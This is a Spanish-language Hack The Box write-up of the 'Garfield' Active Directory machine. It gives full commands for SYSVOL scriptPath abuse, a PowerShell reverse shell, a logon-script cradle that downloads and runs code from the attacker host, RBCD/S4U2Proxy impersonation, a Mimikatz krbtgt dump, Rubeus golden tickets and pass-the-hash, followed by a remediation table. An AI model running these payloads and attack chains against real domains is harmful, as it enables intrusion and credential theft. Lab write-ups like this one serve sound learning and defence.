---
layout: single
classes: wide
title: "Garfield - Writeup"
date: 2026-06-04
difficulty: Difícil
operating_system: Windows
tags:
  - HTB
  - Windows
  - Difícil
  - Active Directory
  - SYSVOL
  - RBCD
  - RODC
  - Golden Ticket
  - Mimikatz
  - Rubeus
  - Chisel
summary: "Explotación completa de un dominio Active Directory partiendo de credenciales iniciales de dominio: abuso de scriptPath en SYSVOL para RCE como l.wilson, ForceChangePassword a l.wilson_adm, RBCD + S4U2Proxy contra un RODC, dump de krbtgt_8245 con Mimikatz, y golden ticket para acceso como Domain Admin."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Difícil |
| IP | `[REDACTED]` |
| Domain | `garfield.htb` |
| DC | `DC01.garfield.htb` |
| Credenciales iniciales | `j.arbuckle` / `[REDACTED]` |
| Tags | `AD`, `SYSVOL`, `RBCD`, `RODC`, `Golden Ticket`, `Mimikatz`, `Rubeus` |
{: .info-table}

---

## Reconocimiento

Empezamos con un escaneo de puertos completo para identificar todos los servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn [REDACTED]
```

Puertos abiertos — clásica máquina Windows Domain Controller:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | Microsoft Windows Kerberos |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS | Microsoft Windows netbios-ssn |
| 389/tcp | LDAP | Microsoft AD LDAP — `garfield.htb` |
| 445/tcp | SMB | Microsoft-ds |
| 464/tcp | kpasswd5 | |
| 593/tcp | RPC over HTTP | |
| 636/tcp | LDAPS | |
| 3268/tcp | Global Catalog | |
| 3389/tcp | RDP | Microsoft Terminal Services |
| 5985/tcp | WinRM | Microsoft HTTPAPI httpd 2.0 |

Confirmamos que es un Domain Controller: `DC01.garfield.htb`, Server 2019 Build 17763.

---

## Enumeración

### SMB — shares accesibles

Con las credenciales proporcionadas (`j.arbuckle`), listamos los recursos compartidos:

```bash
crackmapexec smb [REDACTED] -u j.arbuckle -p '[REDACTED]' --shares
```

Acceso de lectura a `SYSVOL` y `NETLOGON`. En `SYSVOL\garfield.htb\scripts\` encontramos un script `.bat`:

```bash
smbclient //[REDACTED]/SYSVOL -U j.arbuckle
smb: \garfield.htb\scripts\> get printerDetect.bat
```

```bat
@echo off
echo Detecting installed printers...
echo ==============================
wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table
echo.
echo Printer detection completed.
pause
```

### LDAP — user enumeration

Enumeramos usuarios del dominio:

```bash
netexec ldap [REDACTED] -u j.arbuckle -p '[REDACTED]' --users
```

Usuarios relevantes:

| Usuario | Descripción |
|---------|-------------|
| `j.arbuckle` | Usuario inicial (nosotros) |
| `l.wilson` | Usuario de dominio estándar |
| `l.wilson_adm` | **Posible cuenta privilegiada** (2 badPW — tal vez contraseña por defecto o débil) |
| `krbtgt_8245` | Cuenta krbtgt del RODC — ID 8245 |

### bloodAD — permisos de escritura

```bash
bloodyAD --host [REDACTED] -u j.arbuckle -p '[REDACTED]' get writable
```

Entre los objetos con permiso `WRITE` estaba `CN=Liz Wilson` — la cuenta `l.wilson`. Esto nos permite modificar su atributo `scriptPath`.

---

## Explotación — RCE como l.wilson via scriptPath

### El vector

El atributo `scriptPath` en un usuario de AD define un script de inicio de sesión que se ejecuta desde `SYSVOL`. Si tenemos permisos de escritura sobre el usuario y sobre `SYSVOL`, podemos:
1. Subir un `.bat` malicioso a `SYSVOL`
2. Apuntar `scriptPath` del usuario a ese `.bat`
3. Esperar a que el usuario inicie sesión → RCE

### Payload

Creamos una reverse shell en PowerShell:

```powershell
# shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("[REDACTED]",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

Modificamos `printerDetect.bat` para que descargue y ejecute el payload:

```bat
@echo off
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[REDACTED]/shell.ps1')"
```

### Subida y configuración

Subimos el `.bat` malicioso a SYSVOL:

```bash
smbclient //[REDACTED]/SYSVOL \
  -U "garfield.htb/j.arbuckle%[REDACTED]" \
  -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
```

Configuramos `scriptPath` en el objeto de `l.wilson`:

```bash
bloodyAD --host [REDACTED] \
  -u j.arbuckle \
  -p '[REDACTED]' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
  scriptPath \
  -v printerDetect.bat
```

### Recepción de la shell

Montamos servidor HTTP con el `shell.ps1` y un listener en `nc`:

```bash
python3 -m http.server 80 &
nc -nlvp 4444
```

Al poco tiempo recibimos la conexión:

```bash
connect to [REDACTED] from (UNKNOWN) [REDACTED] 54263
whoami
garfield\l.wilson
```

**RCE confirmada como `l.wilson`.**

---

## Pivoting — ForceChangePassword a l.wilson_adm

Desde la shell de `l.wilson` aprovechamos que tenemos permisos para cambiar la contraseña de `l.wilson_adm`:

```powershell
Set-ADAccountPassword -Identity l.wilson_adm -Reset -NewPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force)
Enable-ADAccount l.wilson_adm
```

Esto funciona porque el usuario `l.wilson` tiene el permiso `ForceChangePassword` sobre `l.wilson_adm` (lo vimos en `bloodyAD get writable`).

Accedemos por WinRM como `l.wilson_adm`:

```bash
evil-winrm -i [REDACTED] -u L.WILSON_ADM -p [REDACTED]
```

### User flag

```bash
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
[REDACTED]
```

**🚩 Flag de usuario: `[REDACTED]`**

---

## Escalada de privilegios — RODC compromise → Domain Admin

### Paso 1: Unirse al grupo RODC Administrators

```bash
bloodyAD -u l.wilson_adm -p '[REDACTED]' -d garfield.htb --host [REDACTED] \
  add groupMember "RODC Administrators" l.wilson_adm
```

### Paso 2: SOCKS proxy al segmento interno

El RODC (`RODC01`) está en una subred interna (`192.168.100.0/24`). Usamos **Chisel** para montar un túnel SOCKS5:

```bash
# Atacante
./chisel server -p 8889 --reverse &

# Víctima (evil-winrm)
.\chisel.exe client [REDACTED]:8889 R:socks
```

Configuramos proxychains:

```
socks5 127.0.0.1 1080
```

Confirmamos conectividad al RODC:

```bash
proxychains nmap -sT -Pn -p 445,5985 192.168.100.2
# 445/open, 5985/open
```

### Paso 3: RBCD — Resource-Based Constrained Delegation

Creamos una cuenta de máquina falsa:

```bash
impacket-addcomputer garfield.htb/j.arbuckle:'[REDACTED]' \
  -dc-ip [REDACTED] \
  -computer-name FAKEPC$ \
  -computer-pass '[REDACTED]'
```

Derivamos el AES256 key de la contraseña para usarla en lugar de la contraseña en texto claro:

```bash
python3 -c "
from impacket.krb5.crypto import string_to_key, Enctype
salt = 'GARFIELD.HTBhostfakepc.garfield.htb'
key = string_to_key(Enctype.AES256, '[REDACTED]', salt)
print(key.contents.hex())
"
```

Configuramos RBCD para que `FAKEPC$` pueda delegar en `RODC01$`:

```bash
impacket-rbcd garfield.htb/l.wilson_adm:'[REDACTED]' \
  -delegate-to 'RODC01$' \
  -delegate-from 'FAKEPC$' \
  -action write \
  -dc-ip [REDACTED]
```

Solicitamos un Service Ticket de `Administrator` para `cifs/RODC01.garfield.htb` via S4U2Proxy:

```bash
impacket-getST garfield.htb/FAKEPC\$:'[REDACTED]' \
  -spn cifs/RODC01.garfield.htb \
  -impersonate Administrator \
  -dc-ip [REDACTED] \
  -aesKey [REDACTED]
```

Esto nos da un ticket de `Administrator` para acceder al RODC.

### Paso 4: Acceso al RODC como SYSTEM

Ejecutamos psexec a través del proxy SOCKS:

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
proxychains impacket-psexec -k -no-pass Administrator@RODC01.garfield.htb
```

Y obtenemos una shell como SYSTEM en `RODC01`.

### Paso 5: Dump del hash krbtgt_8245 con Mimikatz

Descargamos Mimikatz:

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[REDACTED]:80/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')"
```

Dumpeamos las credenciales de la cuenta `krbtgt_8245` — la cuenta krbtgt específica del RODC:

```
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

Datos críticos obtenidos:

| Key | Valor |
|-----|-------|
| NTLM | `[REDACTED]` |
| AES256 | `[REDACTED]` |
| SID Dominio | `S-1-5-21-2502726253-3859040611-225969357` |

El RODC tiene su propia cuenta krbtgt (ID 8245) cuyo hash podemos usar para forjar tickets.

### Paso 6: Configurar RODC para revelar contraseña de Administrator

El RODC tiene dos atributos que controlan qué credenciales puede almacenar en caché:
- `msDS-RevealOnDemandGroup` — grupos cuyas credenciales se revelan bajo demanda
- `msDS-NeverRevealGroup` — grupos cuyas credenciales nunca se revelan

Agregamos `Administrator` al grupo de revelación y limpiamos el de restricción:

```powershell
Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
  -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}

Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
  -Clear "msDS-NeverRevealGroup"
```

### Paso 7: Golden Ticket + TGS para krbtgt

Forjamos un golden ticket para `Administrator` usando el AES256 de `krbtgt_8245`:

```powershell
.\Rubeus.exe golden /rodcNumber:8245 `
  /aes256:[REDACTED] `
  /user:Administrator /id:500 `
  /domain:garfield.htb `
  /sid:S-1-5-21-2502726253-3859040611-225969357 `
  /nowrap
```

Esto nos da un ticket TGT de `Administrator` forjado con la clave del RODC krbtgt.

Luego solicitamos un TGS para `krbtgt/garfield.htb` usando ese golden ticket (esto nos da el hash NTLM del propio `Administrator`):

```powershell
.\Rubeus.exe asktgs `
  /keyList `
  /service:"krbtgt/garfield.htb" `
  /dc:"DC01.garfield.htb" `
  /ticket:"[REDACTED]" `
  /nowrap
```

El resultado incluye el hash NTLM de `Administrator`:

| Campo | Valor |
|-------|-------|
| Password Hash | `[REDACTED]` |

### Paso 8: Acceso como Domain Admin al DC01

```bash
evil-winrm -i [REDACTED] -u Administrator -H [REDACTED]
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
garfield\administrator
```

### Root flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[REDACTED]
```

**🚩 Flag de root: `[REDACTED]`**

---

## Cadena de explotación

```
Credenciales iniciales: j.arbuckle / [REDACTED]
        │
        ▼
Escritura en SYSVOL + scriptPath en l.wilson
→ RCE como l.wilson (vía script de inicio de sesión)
        │
        ▼
ForceChangePassword a l.wilson_adm
→ WinRM como l.wilson_adm
→ user.txt ✅
        │
        ▼
Agregado a RODC Administrators + Chisel SOCKS proxy
→ Acceso a segmento interno (192.168.100.0/24)
        │
        ▼
RBCD: FAKEPC$ → RODC01$ + S4U2Proxy
→ psexec como SYSTEM en RODC01
        │
        ▼
Mimikatz: dump krbtgt_8245 hash
→ Golden Ticket forjado con Rubeus
        │
        ▼
Configurar msDS-RevealOnDemandGroup + asktgs
→ Hash NTLM de Administrator
        │
        ▼
Pass-the-hash por WinRM a DC01
→ Domain Admin ✅ → root.txt ✅
```

---

## Vectores explotados

| # | Vector | Impacto |
|---|--------|---------|
| 1 | Permiso `WRITE` sobre `l.wilson` permite modificar `scriptPath` | Ejecución de código arbitrario en inicio de sesión |
| 2 | `SYSVOL` escribible por `j.arbuckle` permite subir `.bat` malicioso | Persistencia del payload en el dominio |
| 3 | `ForceChangePassword` de `l.wilson` sobre `l.wilson_adm` | Escalada a usuario con más privilegios |
| 4 | `l.wilson_adm` puede agregarse a `RODC Administrators` | Control administrativo sobre el RODC |
| 5 | RODC accesible desde segmento interno sin restricciones RBCD mal configurado | Compromiso del RODC vía S4U2Proxy |
| 6 | `krbtgt_8245` con hash extraíble desde RODC | Golden ticket para cualquier cuenta |
| 7 | `msDS-RevealOnDemandGroup` modificable por `l.wilson_adm` | Revelación de hash de `Administrator` |
| 8 | WinRM habilitado en DC01 | Acceso remoto como Domain Admin |

---

## Lecciones técnicas

### scriptPath como vector de RCE
El atributo `scriptPath` en objetos de usuario ejecuta un script desde `SYSVOL` al iniciar sesión. Si un atacante tiene permisos de escritura sobre el usuario y sobre SYSVOL, puede ejecutar código arbitrario. Es un vector clásico pero efectivo en entornos AD mal configurados.

### RODC security boundaries
Un RODC (Read-Only Domain Controller) está diseñado para ubicaciones de baja seguridad. Tiene su propia cuenta krbtgt y puede almacenar contraseñas en caché según grupos. La configuración incorrecta de `msDS-RevealOnDemandGroup` y `msDS-NeverRevealGroup` permite a un atacante revelar credenciales privilegiadas.

### RBCD y S4U2Proxy
Resource-Based Constrained Delegation permite que un objeto (como una cuenta de máquina) delegue en otro. Si se puede crear una cuenta de máquina y configurar RBCD, se puede impersonar cualquier usuario (como Administrator) para acceder al servicio objetivo.

### Golden Ticket con krbtgt de RODC
El hash de `krbtgt_8245` (la cuenta krbtgt del RODC) permite forjar tickets para cualquier usuario en el dominio. Aunque el RODC tiene restricciones, combinado con la modificación de `msDS-RevealOnDemandGroup`, permite obtener el hash de cualquier usuario.

---

## Remediación

| Hallazgo | Remedición |
|----------|------------|
| Permiso `WRITE` excesivo sobre objetos de usuario | Revisar y restringir permisos de escritura usando el principio de mínimo privilegio |
| `SYSVOL` escribible por usuarios no administradores | Restringir permisos de escritura en SYSVOL solo a `Domain Admins` |
| `ForceChangePassword` sobre cuentas privilegiadas | Separar roles y no permitir que usuarios estándar cambien contraseñas de cuentas con más privilegios |
| `l.wilson_adm` en `RODC Administrators` | Revisar membresía de grupos administrativos del RODC |
| RBCD sin restricciones | No permitir que usuarios no administradores creen cuentas de máquina o configuren RBCD |
| `msDS-RevealOnDemandGroup` modificable | Restringir permisos de escritura sobre atributos del RODC |
| WinRM en DC01 | Deshabilitar WinRM en Domain Controllers o restringir por firewall |
